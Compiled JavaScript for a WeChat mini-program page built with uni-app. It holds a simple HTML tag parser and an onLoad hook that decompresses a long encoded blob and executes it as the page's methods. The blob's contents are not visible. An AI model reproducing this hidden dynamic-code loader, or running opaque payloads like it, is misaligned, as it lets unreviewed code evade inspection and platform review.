"use strict";
var common_vendor = require("../../common/vendor.js");
const templateCom = () => "../../components/template.js";
const _sfc_main = {
  components: {
    templateCom
  },
  setup() {
    let html = common_vendor.ref("undefind");
    let { proxy } = common_vendor.getCurrentInstance();
    let _this = proxy;
    const tychange = (typeofData) => {
      return typeof typeofData === "object" ? JSON.stringify(typeofData) : typeofData;
    };
    const parseTag = (tag) => {
      let res = {
        type1: "tag",
        name: "",
        voidElement: false,
        children: []
      };
      let tagMatch = tag.match(/<\/?([^\s]+?)[/\s>]/);
      if (tagMatch) {
        res.type1 = tagMatch[1];
        if (tag.charAt(tag.length - 2) === "/") {
          res.voidElement = true;
        }
      }
      let classList = tag.match(/\s([^'"/\s><]+?)\s*?=\s*?(".*?"|'.*?')/g);
      if (classList) {
        let style = "";
        for (let i = 0; i < classList.length; i++) {
          let c = classList[i].split("=");
          c[0] = c[0].replace(/\s*/g, "");
          var lengthc = 2;
          for (lengthc; lengthc < c.length; lengthc++) {
            c[1] += "=" + c[lengthc];
          }
          let p = c[1].substring(1, c[1].length - 1);
          try {
            p = JSON.parse(c[1].substring(1, c[1].length - 1));
          } catch (e) {
          }
          if (c[1]) {
            if (c[0] === " style") {
              style = p + style;
              res[c[0]] = style;
            } else {
              res[c[0]] = p;
            }
          }
        }
      }
      console.log(JSON.parse(JSON.stringify(res, null, 2)));
      return res;
    };
    const parse = (html2) => {
      var that = _this;
      let result = [];
      let current;
      let level = -1;
      let arr = [];
      let tagRE = /<[a-zA-Z\-\!\/](?:"[^"]*"['"]*|'[^']*'['"]*|[^'">])*>/g;
      html2.replace(tagRE, function(tag, index) {
        let isOpen = tag.charAt(1) !== "/";
        let start = index + tag.length;
        let text = html2.slice(start, html2.indexOf("<", start));
        let parent;
        if (isOpen) {
          level++;
          current = that.parseTag(tag);
          if (!current.voidElement && text.trim()) {
            current["text"] = text;
          }
          if (level === 0) {
            result.push(current);
          }
          parent = arr[level - 1];
          if (parent) {
            parent.children.push(current);
          }
          arr[level] = current;
        }
        if (!isOpen || current.voidElement) {
          level--;
        }
      });
      return result;
    };
    common_vendor.onLoad(() => {
      let { pakoRun } = proxy.$pakoRun;
      let args = {
        code: `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`
      };
      if (args) {
        try {
          let onLoad = pakoRun(args, args.code);
          let method = onLoad();
          for (const key in method) {
            _this[key] = method[key];
          }
          _this.onLoad();
        } catch (err) {
          console.log(err);
        }
      }
    });
    return { tychange, parseTag, parse, html };
  }
};
if (!Array) {
  const _component_templateCom = common_vendor.resolveComponent("templateCom");
  _component_templateCom();
}
function _sfc_render(_ctx, _cache, $props, $setup, $data, $options) {
  return {
    a: common_vendor.p({
      data: $setup.html
    })
  };
}
var MiniProgramPage = /* @__PURE__ */ common_vendor._export_sfc(_sfc_main, [["render", _sfc_render], ["__file", "/Users/yangchong/Desktop/dynamicUni_3/pages/index/index.vue"]]);
wx.createPage(MiniProgramPage);
